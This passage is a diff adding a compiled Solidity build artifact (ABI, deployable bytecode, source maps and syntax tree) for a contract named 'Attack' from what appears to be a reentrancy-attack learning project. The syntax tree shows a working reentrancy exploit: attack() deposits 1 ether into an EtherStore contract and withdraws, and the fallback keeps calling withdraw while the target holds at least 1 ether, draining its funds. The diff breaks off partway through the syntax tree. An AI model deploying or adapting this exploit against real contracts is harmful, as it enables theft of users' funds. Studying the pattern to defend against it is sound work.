@@ -1,0 +1,930 @@
+{
+    "contractName": "Attack",
+    "abi": [
+        {
+            "inputs": [
+                {
+                    "internalType": "address",
+                    "name": "_etherStoreAddress",
+                    "type": "address"
+                }
+            ],
+            "stateMutability": "nonpayable",
+            "type": "constructor"
+        },
+        {
+            "stateMutability": "payable",
+            "type": "fallback"
+        },
+        {
+            "inputs": [],
+            "name": "attack",
+            "outputs": [],
+            "stateMutability": "payable",
+            "type": "function"
+        },
+        {
+            "inputs": [],
+            "name": "etherstore",
+            "outputs": [
+                {
+                    "internalType": "contract EtherStore",
+                    "name": "",
+                    "type": "address"
+                }
+            ],
+            "stateMutability": "view",
+            "type": "function"
+        },
+        {
+            "inputs": [],
+            "name": "getBalance",
+            "outputs": [
+                {
+                    "internalType": "uint256",
+                    "name": "",
+                    "type": "uint256"
+                }
+            ],
+            "stateMutability": "view",
+            "type": "function"
+        }
+    ],
+    "metadata": "{\"compiler\":{\"version\":\"0.8.12+commit.f00d7308\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_etherStoreAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"etherstore\",\"outputs\":[{\"internalType\":\"contract EtherStore\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"/home/dukhovny/Solidity/Re-Entrancy Attack/contracts/Attack.sol\":\"Attack\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"/home/dukhovny/Solidity/Re-Entrancy Attack/contracts/Attack.sol\":{\"keccak256\":\"0x93aa510a9e67119f528a5a7791ed516eae8231a1ea3fccd1566a08b0082412e8\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://f012fa32db6528b6d1da2c3dce15ef1a5af8ff80a2190af8ae2761ae51a8bab1\",\"dweb:/ipfs/QmamgtN5YzRvY3BX4yfsnREMTZGHufWsTqXbnJcYGWR2bw\"]},\"/home/dukhovny/Solidity/Re-Entrancy Attack/contracts/EtherStore.sol\":{\"keccak256\":\"0x8e4175c6d111a1f3c9b87b8e3091c956ba38844f5c774910685125f5696b5eac\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://c747d13188593c446d9f10f3ed9cb7a747b098389a9d392d917e602da2e176c0\",\"dweb:/ipfs/QmXRZgrNRJb3EQSuEL6CXXuivvoz3K7eghZnvbMZDpx4aF\"]}},\"version\":1}",
+    "bytecode": "608060405234801561001057600080fd5b506040516102b13803806102b183398101604081905261002f91610054565b600080546001600160a01b0319166001600160a01b0392909216919091179055610084565b60006020828403121561006657600080fd5b81516001600160a01b038116811461007d57600080fd5b9392505050565b61021e806100936000396000f3fe6080604052600436106100345760003560e01c806312065fe0146100ad57806379c30d2f146100cd5780639e5faafc14610105575b600054670de0b6b3a76400006001600160a01b0390911631106100ab576000805460408051633ccfd60b60e01b815290516001600160a01b0390921692633ccfd60b9260048084019382900301818387803b15801561009257600080fd5b505af11580156100a6573d6000803e3d6000fd5b505050505b005b3480156100b957600080fd5b506040514781526020015b60405180910390f35b3480156100d957600080fd5b506000546100ed906001600160a01b031681565b6040516001600160a01b0390911681526020016100c4565b6100ab670de0b6b3a764000034101561011d57600080fd5b60008054906101000a90046001600160a01b03166001600160a01b031663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561017357600080fd5b505af1158015610187573d6000803e3d6000fd5b50506000805460408051633ccfd60b60e01b815290516001600160a01b039092169550633ccfd60b9450600480820194509082900301818387803b1580156101ce57600080fd5b505af11580156101e2573d6000803e3d6000fd5b5050505056fea2646970667358221220acbb59c1b97968bd35d1862de9d3677068952e960d2aa060d324e7d44356dfab64736f6c634300080c0033",
+    "deployedBytecode": "6080604052600436106100345760003560e01c806312065fe0146100ad57806379c30d2f146100cd5780639e5faafc14610105575b600054670de0b6b3a76400006001600160a01b0390911631106100ab576000805460408051633ccfd60b60e01b815290516001600160a01b0390921692633ccfd60b9260048084019382900301818387803b15801561009257600080fd5b505af11580156100a6573d6000803e3d6000fd5b505050505b005b3480156100b957600080fd5b506040514781526020015b60405180910390f35b3480156100d957600080fd5b506000546100ed906001600160a01b031681565b6040516001600160a01b0390911681526020016100c4565b6100ab670de0b6b3a764000034101561011d57600080fd5b60008054906101000a90046001600160a01b03166001600160a01b031663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561017357600080fd5b505af1158015610187573d6000803e3d6000fd5b50506000805460408051633ccfd60b60e01b815290516001600160a01b039092169550633ccfd60b9450600480820194509082900301818387803b1580156101ce57600080fd5b505af11580156101e2573d6000803e3d6000fd5b5050505056fea2646970667358221220acbb59c1b97968bd35d1862de9d3677068952e960d2aa060d324e7d44356dfab64736f6c634300080c0033",
+    "sourceMap": "86:697:0:-:0;;;144:100;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;194:10;:43;;-1:-1:-1;;;;;;194:43:0;-1:-1:-1;;;;;194:43:0;;;;;;;;;;86:697;;14:290:2;84:6;137:2;125:9;116:7;112:23;108:32;105:52;;;153:1;150;143:12;105:52;179:16;;-1:-1:-1;;;;;224:31:2;;214:42;;204:70;;270:1;267;260:12;204:70;293:5;14:290;-1:-1:-1;;;14:290:2:o;:::-;86:697:0;;;;;;",
+    "deployedSourceMap": "86:697:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;372:10;;395:7;-1:-1:-1;;;;;372:10:0;;;364:27;:38;360:90;;418:10;;;:21;;;-1:-1:-1;;;418:21:0;;;;-1:-1:-1;;;;;418:10:0;;;;:19;;:21;;;;;;;;;;:10;;:21;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;360:90;86:697;687:94;;;;;;;;;;-1:-1:-1;687:94:0;;753:21;160:25:2;;148:2;133:18;687:94:0;;;;;;;;109:28;;;;;;;;;;-1:-1:-1;109:28:0;;;;-1:-1:-1;;;;;109:28:0;;;;;;-1:-1:-1;;;;;378:32:2;;;360:51;;348:2;333:18;109:28:0;196:221:2;462:158:0;;528:7;515:9;:20;;507:29;;;;;;546:10;;;;;;;;-1:-1:-1;;;;;546:10:0;-1:-1:-1;;;;;546:18:0;;572:7;546:36;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;592:10:0;;;:21;;;-1:-1:-1;;;592:21:0;;;;-1:-1:-1;;;;;592:10:0;;;;-1:-1:-1;592:19:0;;-1:-1:-1;592:21:0;;;;;-1:-1:-1;592:21:0;;;;;;:10;;:21;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;462:158::o",
+    "sourcePath": "/home/dukhovny/Solidity/Re-Entrancy Attack/contracts/Attack.sol",
+    "compiler": {
+        "name": "solc",
+        "version": "0.8.12+commit.f00d7308"
+    },
+    "ast": {
+        "absolutePath": "/home/dukhovny/Solidity/Re-Entrancy Attack/contracts/Attack.sol",
+        "exportedSymbols": {
+            "Attack": [
+                71
+            ],
+            "EtherStore": [
+                142
+            ]
+        },
+        "id": 72,
+        "license": "MIT",
+        "nodeType": "SourceUnit",
+        "nodes": [
+            {
+                "id": 1,
+                "literals": [
+                    "solidity",
+                    "^",
+                    "0.8",
+                    ".10"
+                ],
+                "nodeType": "PragmaDirective",
+                "src": "32:24:0"
+            },
+            {
+                "absolutePath": "/home/dukhovny/Solidity/Re-Entrancy Attack/contracts/EtherStore.sol",
+                "file": "./EtherStore.sol",
+                "id": 2,
+                "nameLocation": "-1:-1:-1",
+                "nodeType": "ImportDirective",
+                "scope": 72,
+                "sourceUnit": 143,
+                "src": "58:26:0",
+                "symbolAliases": [],
+                "unitAlias": ""
+            },
+            {
+                "abstract": false,
+                "baseContracts": [],
+                "canonicalName": "Attack",
+                "contractDependencies": [],
+                "contractKind": "contract",
+                "fullyImplemented": true,
+                "id": 71,
+                "linearizedBaseContracts": [
+                    71
+                ],
+                "name": "Attack",
+                "nameLocation": "95:6:0",
+                "nodeType": "ContractDefinition",
+                "nodes": [
+                    {
+                        "constant": false,
+                        "functionSelector": "79c30d2f",
+                        "id": 5,
+                        "mutability": "mutable",
+                        "name": "etherstore",
+                        "nameLocation": "127:10:0",
+                        "nodeType": "VariableDeclaration",
+                        "scope": 71,
+                        "src": "109:28:0",
+                        "stateVariable": true,
+                        "storageLocation": "default",
+                        "typeDescriptions": {
+                            "typeIdentifier": "t_contract$_EtherStore_$142",
+                            "typeString": "contract EtherStore"
+                        },
+                        "typeName": {
+                            "id": 4,
+                            "nodeType": "UserDefinedTypeName",
+                            "pathNode": {
+                                "id": 3,
+                                "name": "EtherStore",
+                                "nodeType": "IdentifierPath",
+                                "referencedDeclaration": 142,
+                                "src": "109:10:0"
+                            },
+                            "referencedDeclaration": 142,
+                            "src": "109:10:0",
+                            "typeDescriptions": {
+                                "typeIdentifier": "t_contract$_EtherStore_$142",
+                                "typeString": "contract EtherStore"
+                            }
+                        },
+                        "visibility": "public"
+                    },
+                    {
+                        "body": {
+                            "id": 16,
+                            "nodeType": "Block",
+                            "src": "184:60:0",
+                            "statements": [
+                                {
+                                    "expression": {
+                                        "id": 14,
+                                        "isConstant": false,
+                                        "isLValue": false,
+                                        "isPure": false,
+                                        "lValueRequested": false,
+                                        "leftHandSide": {
+                                            "id": 10,
+                                            "name": "etherstore",
+                                            "nodeType": "Identifier",
+                                            "overloadedDeclarations": [],
+                                            "referencedDeclaration": 5,
+                                            "src": "194:10:0",
+                                            "typeDescriptions": {
+                                                "typeIdentifier": "t_contract$_EtherStore_$142",
+                                                "typeString": "contract EtherStore"
+                                            }
+                                        },
+                                        "nodeType": "Assignment",
+                                        "operator": "=",
+                                        "rightHandSide": {
+                                            "arguments": [
+                                                {
+                                                    "id": 12,
+                                                    "name": "_etherStoreAddress",
+                                                    "nodeType": "Identifier",
+                                                    "overloadedDeclarations": [],
+                                                    "referencedDeclaration": 7,
+                                                    "src": "218:18:0",
+                                                    "typeDescriptions": {
+                                                        "typeIdentifier": "t_address",
+                                                        "typeString": "address"
+                                                    }
+                                                }
+                                            ],
+                                            "expression": {
+                                                "argumentTypes": [
+                                                    {
+                                                        "typeIdentifier": "t_address",
+                                                        "typeString": "address"
+                                                    }
+                                                ],
+                                                "id": 11,
+                                                "name": "EtherStore",
+                                                "nodeType": "Identifier",
+                                                "overloadedDeclarations": [],
+                                                "referencedDeclaration": 142,
+                                                "src": "207:10:0",
+                                                "typeDescriptions": {
+                                                    "typeIdentifier": "t_type$_t_contract$_EtherStore_$142_$",
+                                                    "typeString": "type(contract EtherStore)"
+                                                }
+                                            },
+                                            "id": 13,
+                                            "isConstant": false,
+                                            "isLValue": false,
+                                            "isPure": false,
+                                            "kind": "typeConversion",
+                                            "lValueRequested": false,
+                                            "names": [],
+                                            "nodeType": "FunctionCall",
+                                            "src": "207:30:0",
+                                            "tryCall": false,
+                                            "typeDescriptions": {
+                                                "typeIdentifier": "t_contract$_EtherStore_$142",
+                                                "typeString": "contract EtherStore"
+                                            }
+                                        },
+                                        "src": "194:43:0",
+                                        "typeDescriptions": {
+                                            "typeIdentifier": "t_contract$_EtherStore_$142",
+                                            "typeString": "contract EtherStore"
+                                        }
+                                    },
+                                    "id": 15,
+                                    "nodeType": "ExpressionStatement",
+                                    "src": "194:43:0"
+                                }
+                            ]
+                        },
+                        "id": 17,
+                        "implemented": true,
+                        "kind": "constructor",
+                        "modifiers": [],
+                        "name": "",
+                        "nameLocation": "-1:-1:-1",
+                        "nodeType": "FunctionDefinition",
+                        "parameters": {
+                            "id": 8,
+                            "nodeType": "ParameterList",
+                            "parameters": [
+                                {
+                                    "constant": false,
+                                    "id": 7,
+                                    "mutability": "mutable",
+                                    "name": "_etherStoreAddress",
+                                    "nameLocation": "164:18:0",
+                                    "nodeType": "VariableDeclaration",
+                                    "scope": 17,
+                                    "src": "156:26:0",
+                                    "stateVariable": false,
+                                    "storageLocation": "default",
+                                    "typeDescriptions": {
+                                        "typeIdentifier": "t_address",
+                                        "typeString": "address"
+                                    },
+                                    "typeName": {
+                                        "id": 6,
+                                        "name": "address",
+                                        "nodeType": "ElementaryTypeName",
+                                        "src": "156:7:0",
+                                        "stateMutability": "nonpayable",
+                                        "typeDescriptions": {
+                                            "typeIdentifier": "t_address",
+                                            "typeString": "address"
+                                        }
+                                    },
+                                    "visibility": "internal"
+                                }
+                            ],
+                            "src": "155:28:0"
+                        },
+                        "returnParameters": {
+                            "id": 9,
+                            "nodeType": "ParameterList",
+                            "parameters": [],
+                            "src": "184:0:0"
+                        },
+                        "scope": 71,
+                        "src": "144:100:0",
+                        "stateMutability": "nonpayable",
+                        "virtual": false,
+                        "visibility": "public"
+                    },
+                    {
+                        "body": {
+                            "id": 34,
+                            "nodeType": "Block",
+                            "src": "350:106:0",
+                            "statements": [
+                                {
+                                    "condition": {
+                                        "commonType": {
+                                            "typeIdentifier": "t_uint256",
+                                            "typeString": "uint256"
+                                        },
+                                        "id": 26,
+                                        "isConstant": false,
+                                        "isLValue": false,
+                                        "isPure": false,
+                                        "lValueRequested": false,
+                                        "leftExpression": {
+                                            "expression": {
+                                                "arguments": [
+                                                    {
+                                                        "id": 22,
+                                                        "name": "etherstore",
+                                                        "nodeType": "Identifier",
+                                                        "overloadedDeclarations": [],
+                                                        "referencedDeclaration": 5,
+                                                        "src": "372:10:0",
+                                                        "typeDescriptions": {
+                                                            "typeIdentifier": "t_contract$_EtherStore_$142",
+                                                            "typeString": "contract EtherStore"
+                                                        }
+                                                    }
+                                                ],
+                                                "expression": {
+                                                    "argumentTypes": [
+                                                        {
+                                                            "typeIdentifier": "t_contract$_EtherStore_$142",
+                                                            "typeString": "contract EtherStore"
+                                                        }
+                                                    ],
+                                                    "id": 21,
+                                                    "isConstant": false,
+                                                    "isLValue": false,
+                                                    "isPure": true,
+                                                    "lValueRequested": false,
+                                                    "nodeType": "ElementaryTypeNameExpression",
+                                                    "src": "364:7:0",
+                                                    "typeDescriptions": {
+                                                        "typeIdentifier": "t_type$_t_address_$",
+                                                        "typeString": "type(address)"
+                                                    },
+                                                    "typeName": {
+                                                        "id": 20,
+                                                        "name": "address",
+                                                        "nodeType": "ElementaryTypeName",
+                                                        "src": "364:7:0",
+                                                        "typeDescriptions": {}
+                                                    }
+                                                },
+                                                "id": 23,
+                                                "isConstant": false,
+                                                "isLValue": false,
+                                                "isPure": false,
+                                                "kind": "typeConversion",
+                                                "lValueRequested": false,
+                                                "names": [],
+                                                "nodeType": "FunctionCall",
+                                                "src": "364:19:0",
+                                                "tryCall": false,
+                                                "typeDescriptions": {
+                                                    "typeIdentifier": "t_address",
+                                                    "typeString": "address"
+                                                }
+                                            },
+                                            "id": 24,
+                                            "isConstant": false,
+                                            "isLValue": false,
+                                            "isPure": false,
+                                            "lValueRequested": false,
+                                            "memberName": "balance",
+                                            "nodeType": "MemberAccess",
+                                            "src": "364:27:0",
+                                            "typeDescriptions": {
+                                                "typeIdentifier": "t_uint256",
+                                                "typeString": "uint256"
+                                            }
+                                        },
+                                        "nodeType": "BinaryOperation",
+                                        "operator": ">=",
+                                        "rightExpression": {
+                                            "hexValue": "31",
+                                            "id": 25,
+                                            "isConstant": false,
+                                            "isLValue": false,
+                                            "isPure": true,
+                                            "kind": "number",
+                                            "lValueRequested": false,
+                                            "nodeType": "Literal",
+                                            "src": "395:7:0",
+                                            "subdenomination": "ether",
+                                            "typeDescriptions": {
+                                                "typeIdentifier": "t_rational_1000000000000000000_by_1",
+                                                "typeString": "int_const 1000000000000000000"
+                                            },
+                                            "value": "1"
+                                        },
+                                        "src": "364:38:0",
+                                        "typeDescriptions": {
+                                            "typeIdentifier": "t_bool",
+                                            "typeString": "bool"
+                                        }
+                                    },
+                                    "id": 33,
+                                    "nodeType": "IfStatement",
+                                    "src": "360:90:0",
+                                    "trueBody": {
+                                        "id": 32,
+                                        "nodeType": "Block",
+                                        "src": "404:46:0",
+                                        "statements": [
+                                            {
+                                                "expression": {
+                                                    "arguments": [],
+                                                    "expression": {
+                                                        "argumentTypes": [],
+                                                        "expression": {
+                                                            "id": 27,
+                                                            "name": "etherstore",
+                                                            "nodeType": "Identifier",
+                                                            "overloadedDeclarations": [],
+                                                            "referencedDeclaration": 5,
+                                                            "src": "418:10:0",
+                                                            "typeDescriptions": {
+                                                                "typeIdentifier": "t_contract$_EtherStore_$142",
+                                                                "typeString": "contract EtherStore"
+                                                            }
+                                                        },
+                                                        "id": 29,
+                                                        "isConstant": false,
+                                                        "isLValue": false,
+                                                        "isPure": false,
+                                                        "lValueRequested": false,
+                                                        "memberName": "withdraw",
+                                                        "nodeType": "MemberAccess",
+                                                        "referencedDeclaration": 129,
+                                                        "src": "418:19:0",
+                                                        "typeDescriptions": {
+                                                            "typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
+                                                            "typeString": "function () external"
+                                                        }
+                                                    },
+                                                    "id": 30,
+                                                    "isConstant": false,
+                                                    "isLValue": false,
+                                                    "isPure": false,
+                                                    "kind": "functionCall",
+                                                    "lValueRequested": false,
+                                                    "names": [],
+                                                    "nodeType": "FunctionCall",
+                                                    "src": "418:21:0",
+                                                    "tryCall": false,
+                                                    "typeDescriptions": {
+                                                        "typeIdentifier": "t_tuple$__$",
+                                                        "typeString": "tuple()"
+                                                    }
+                                                },
+                                                "id": 31,
+                                                "nodeType": "ExpressionStatement",
+                                                "src": "418:21:0"
+                                            }
+                                        ]
+                                    }
+                                }
+                            ]
+                        },
+                        "id": 35,
+                        "implemented": true,
+                        "kind": "fallback",
+                        "modifiers": [],
+                        "name": "",
+                        "nameLocation": "-1:-1:-1",
+                        "nodeType": "FunctionDefinition",
+                        "parameters": {
+                            "id": 18,
+                            "nodeType": "ParameterList",
+                            "parameters": [],
+                            "src": "330:2:0"
+                        },
+                        "returnParameters": {
+                            "id": 19,
+                            "nodeType": "ParameterList",
+                            "parameters": [],
+                            "src": "350:0:0"
+                        },
+                        "scope": 71,
+                        "src": "322:134:0",
+                        "stateMutability": "payable",
+                        "virtual": false,
+                        "visibility": "external"
+                    },
+                    {
+                        "body": {
+                            "id": 57,
+                            "nodeType": "Block",
+                            "src": "497:123:0",
+                            "statements": [
+                                {
+                                    "expression": {
+                                        "arguments": [
+                                            {
+                                                "commonType": {
+                                                    "typeIdentifier": "t_uint256",
+                                                    "typeString": "uint256"
+                                                },
+                                                "id": 42,
+                                                "isConstant": false,
+                                                "isLValue": false,
+                                                "isPure": false,
+                                                "lValueRequested": false,
+                                                "leftExpression": {
+                                                    "expression": {
+                                                        "id": 39,
+                                                        "name": "msg",
+                                                        "nodeType": "Identifier",
+                                                        "overloadedDeclarations": [],
+                                                        "referencedDeclaration": 4294967281,
+                                                        "src": "515:3:0",
+                                                        "typeDescriptions": {
+                                                            "typeIdentifier": "t_magic_message",
+                                                            "typeString": "msg"
+                                                        }
+                                                    },
+                                                    "id": 40,
+                                                    "isConstant": false,
+                                                    "isLValue": false,
+                                                    "isPure": false,
+                                                    "lValueRequested": false,
+                                                    "memberName": "value",
+                                                    "nodeType": "MemberAccess",
+                                                    "src": "515:9:0",
+                                                    "typeDescriptions": {
+                                                        "typeIdentifier": "t_uint256",
+                                                        "typeString": "uint256"
+                                                    }
+                                                },
+                                                "nodeType": "BinaryOperation",
+                                                "operator": ">=",
+                                                "rightExpression": {
+                                                    "hexValue": "31",
+                                                    "id": 41,
+                                                    "isConstant": false,
+                                                    "isLValue": false,
+                                                    "isPure": true,
+                                                    "kind": "number",
+                                                    "lValueRequested": false,
+                                                    "nodeType": "Literal",
+                                                    "src": "528:7:0",
+                                                    "subdenomination": "ether",
+                                                    "typeDescriptions": {
+                                                        "typeIdentifier": "t_rational_1000000000000000000_by_1",
+                                                        "typeString": "int_const 1000000000000000000"
+                                                    },
+                                                    "value": "1"
+                                                },
+                                                "src": "515:20:0",
+                                                "typeDescriptions": {
+                                                    "typeIdentifier": "t_bool",
+                                                    "typeString": "bool"
+                                                }
+                                            }
+                                        ],
+                                        "expression": {
+                                            "argumentTypes": [
+                                                {
+                                                    "typeIdentifier": "t_bool",
+                                                    "typeString": "bool"
+                                                }
+                                            ],
+                                            "id": 38,
+                                            "name": "require",
+                                            "nodeType": "Identifier",
+                                            "overloadedDeclarations": [
+                                                4294967278,
+                                                4294967278
+                                            ],
+                                            "referencedDeclaration": 4294967278,
+                                            "src": "507:7:0",
+                                            "typeDescriptions": {
+                                                "typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
+                                                "typeString": "function (bool) pure"
+                                            }
+                                        },
+                                        "id": 43,
+                                        "isConstant": false,
+                                        "isLValue": false,
+                                        "isPure": false,
+                                        "kind": "functionCall",
+                                        "lValueRequested": false,
+                                        "names": [],
+                                        "nodeType": "FunctionCall",
+                                        "src": "507:29:0",
+                                        "tryCall": false,
+                                        "typeDescriptions": {
+                                            "typeIdentifier": "t_tuple$__$",
+                                            "typeString": "tuple()"
+                                        }
+                                    },
+                                    "id": 44,
+                                    "nodeType": "ExpressionStatement",
+                                    "src": "507:29:0"
+                                },
+                                {
+                                    "expression": {
+                                        "arguments": [],
+                                        "expression": {
+                                            "argumentTypes": [],
+                                            "expression": {
+                                                "argumentTypes": [],
+                                                "expression": {
+                                                    "id": 45,
+                                                    "name": "etherstore",
+                                                    "nodeType": "Identifier",
+                                                    "overloadedDeclarations": [],
+                                                    "referencedDeclaration": 5,
+                                                    "src": "546:10:0",
+                                                    "typeDescriptions": {
+                                                        "typeIdentifier": "t_contract$_EtherStore_$142",
+                                                        "typeString": "contract EtherStore"
+                                                    }
+                                                },
+                                                "id": 47,
+                                                "isConstant": false,
+                                                "isLValue": false,
+                                                "isPure": false,
+                                                "lValueRequested": false,
+                                                "memberName": "deposit",
+                                                "nodeType": "MemberAccess",
+                                                "referencedDeclaration": 89,
+                                                "src": "546:18:0",
+                                                "typeDescriptions": {
+                                                    "typeIdentifier": "t_function_external_payable$__$returns$__$",
+                                                    "typeString": "function () payable external"
+                                                }
+                                            },
+                                            "id": 49,
+                                            "isConstant": false,
+                                            "isLValue": false,
+                                            "isPure": false,
+                                            "lValueRequested": false,
+                                            "names": [
+                                                "value"
+                                            ],
+                                            "nodeType": "FunctionCallOptions",
+                                            "options": [
+                                                {
+                                                    "hexValue": "31",
+                                                    "id": 48,
+                                                    "isConstant": false,
+                                                    "isLValue": false,
+                                                    "isPure": true,
+                                                    "kind": "number",
+                                                    "lValueRequested": false,
+                                                    "nodeType": "Literal",
+                                                    "src": "572:7:0",
+                                                    "subdenomination": "ether",
+                                                    "typeDescriptions": {
+                                                        "typeIdentifier": "t_rational_1000000000000000000_by_1",
+                                                        "typeString": "int_const 1000000000000000000"
+                                                    },
+                                                    "value": "1"
+                                                }
+                                            ],
+                                            "src": "546:34:0",
+                                            "typeDescriptions": {
+                                                "typeIdentifier": "t_function_external_payable$__$returns$__$value",
+                                                "typeString": "function () payable external"
+                                            }
+                                        },
+                                        "id": 50,
+                                        "isConstant": false,
+                                        "isLValue": false,
+                                        "isPure": false,
+                                        "kind": "functionCall",
+                                        "lValueRequested": false,
+                                        "names": [],
+                                        "nodeType": "FunctionCall",
+                                        "src": "546:36:0",
+                                        "tryCall": false,
+                                        "typeDescriptions": {
+                                            "typeIdentifier": "t_tuple$__$",
+                                            "typeString": "tuple()"
+                                        }
+                                    },
+                                    "id": 51,
+                                    "nodeType": "ExpressionStatement",
+                                    "src": "546:36:0"
+                                },
+                                {
+                                    "expression": {
+                                        "arguments": [],
+                                        "expression": {
+                                            "argumentTypes": [],
+                                            "expression": {
+                                                "id": 52,
+                                                "name": "etherstore",
+                                                "nodeType": "Identifier",
+                                                "overloadedDeclarations": [],
+                                                "referencedDeclaration": 5,
+                                                "src": "592:10:0",
+                                                "typeDescriptions": {
+                                                    "typeIdentifier": "t_contract$_EtherStore_$142",
+                                                    "typeString": "contract EtherStore"
+                                                }
+                                            },
+                                            "id": 54,
+                                            "isConstant": false,
+                                            "isLValue": false,
+                                            "isPure": false,
+                                            "lValueRequested": false,
+                                            "memberName": "withdraw",
+                                            "nodeType": "MemberAccess",
+                                            "referencedDeclaration": 129,
+                                            "src": "592:19:0",
+                                            "typeDescriptions": {
+                                                "typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
+                                                "typeString": "function () external"
+                                            }
+                                        },
+                                        "id": 55,
+                                        "isConstant": false,
+                                        "isLValue": false,
+                                        "isPure": false,
+                                        "kind": "functionCall",
+                                        "lValueRequested": false,
+                                        "names": [],
+                                        "nodeType": "FunctionCall",
+                                        "src": "592:21:0",
+                                        "tryCall": false,
+                                        "typeDescriptions": {
+                                            "typeIdentifier": "t_tuple$__$",
+                                            "typeString": "tuple()"
+                                        }
+                                    },
+                                    "id": 56,
+                                    "nodeType": "ExpressionStatement",
+                                    "src": "592:21:0"
+                                }
+                            ]
+                        },
+                        "functionSelector": "9e5faafc",
+                        "id": 58,
+                        "implemented": true,
+                        "kind": "function",
+                        "modifiers": [],
+                        "name": "attack",
+                        "nameLocation": "471:6:0",
+                        "nodeType": "FunctionDefinition",
+                        "parameters": {
+                            "id": 36,
+                            "nodeType": "ParameterList",
+                            "parameters": [],
+                            "src": "477:2:0"
+                        },
+                        "returnParameters": {
+                            "id": 37,
+                            "nodeType": "ParameterList",
+                            "parameters": [],
+                            "src": "497:0:0"
+                        },
+                        "scope": 71,
+                        "src": "462:158:0",
+                        "stateMutability": "payable",
+                        "virtual": false,
+                        "visibility": "external"
+                    },
+                    {
+                        "body": {
+                            "id": 69,
+                            "nodeType": "Block",
+                            "src": "736:45:0",
+                            "statements": [
+                                {
+                                    "expression": {
+                                        "expression": {
+                                            "arguments": [
+                                                {
+                                                    "id": 65,
+                                                    "name": "this",
+                                                    "nodeType": "Identifier",
+                                                    "overloadedDeclarations": [],
+                                                    "referencedDeclaration": 4294967268,
+                                                    "src": "761:4:0",
+                                                    "typeDescriptions": {
+                                                        "typeIdentifier": "t_contract$_Attack_$71",
+                                                        "typeString": "contract Attack"
+                                                    }
+                                                }
+                                            ],
+                                            "expression": {
+                                                "argumentTypes": [
+                                                    {
+                                                        "typeIdentifier": "t_contract$_Attack_$71",
+                                                        "typeString": "contract Attack"
+                                                    }
+                                                ],
+                                                "id": 64,
+                                                "isConstant": false,
+                                                "isLValue": false,
+                                                "isPure": true,
+                                                "lValueRequested": false,
+                                                "nodeType": "ElementaryTypeNameExpression",
+                                                "src": "753:7:0",
+                                                "typeDescriptions": {
+                                                    "typeIdentifier": "t_type$_t_address_$",
+                                                    "typeString": "type(address)"
+                                                },
+                                                "typeName": {
+                                                    "id": 63,
+                                                    "name": "address",
+                                                    "nodeType": "ElementaryTypeName",
+                                                    "src": "753:7:0",
+                                                    "typeDescriptions": {}
+                                                }
+                                            },
+                                            "id": 66,
+                                            "isConstant": false,
+                                            "isLValue": false,
+                                            "isPure": false,
+                                            "kind": "typeConversion",
+                                            "lValueRequested": false,
+                                            "names": [],
+                                            "nodeType": "FunctionCall",
+                                            "src": "753:13:0",
+                                            "tryCall": false,
+                                            "typeDescriptions": {
+                                                "typeIdentifier": "t_address",
+                                                "typeString": "address"
+                                            }
+                                        },
+                                        "id": 67,
+                                        "isConstant": false,
+                                        "isLValue": false,
+                                        "isPure": false,
+                                        "lValueRequested": false,
+                                        "memberName": "balance",
+                                        "nodeType": "MemberAccess",
+                                        "src": "753:21:0",
+                                        "typeDescriptions": {
+                                            "typeIdentifier": "t_uint256",
+                                            "typeString": "uint256"
+                                        }
+                                    },
+                                    "functionReturnParameters": 62,
+                                    "id": 68,
+                                    "nodeType": "Return",
+                                    "src": "746:28:0"
+                                }
+                            ]
+                        },
+                        "functionSelector": "12065fe0",
+                        "id": 70,
+                        "implemented": true,
+                        "kind": "function",
+                        "modifiers": [],
+                        "name": "getBalance",
+                        "nameLocation": "696:10:0",
+                        "nodeType": "FunctionDefinition",
+                        "parameters": {
+                            "id": 59,
+                            "nodeType": "ParameterList",
+                            "parameters": [],
+                            "src": "706:2:0"
+                        },
+                        "returnParameters": {
+                            "id": 62,
+                            "nodeType": "ParameterList",
+                            "parameters": [
+                                {
+                                    "constant": false,
+                                    "id": 61,
+                                    "mutability": "mutable",
+                                    "name": "",
+                                    "nameLocation": "-1:-1:-1",
+                                    "nodeType": "VariableDeclaration",
+                                    "scope": 70,
+                                    "src": "730:4:0",
+                                    "stateVariable": false,
+                                    "storageLocation": "default",
+                                    "typeDescriptions": {
+                                        "typeIdentifier": "t_uint256",
+                                        "typeString": "uint256"
+                                    },
+                                    "typeName": {
+                                        "id": 60,
+                                        "name": "uint",
+                                        "nodeType": "ElementaryTypeName",
+                                        "src": "730:4:0",
+                                        "typeDescriptions": {
+                                            "typeIdentifier": "t_uint256",
+                                            "typeString": "uint256"
+                                        }
+                                    },
+                                    "visibility": "internal"
+                                }
+                            ],
+                            "src": "729:6:0"
+                        },
+                        "scope": 71,
+                        "src": "687:94:0",
+                        "stateMutability": "view",
+                        "virtual": false,
+                        "visibility": "public"
+                    }
+                ],
+                "scope": 72,
+                "src": "86:697:0",
+                "usedErrors": []
+            }
+        ],
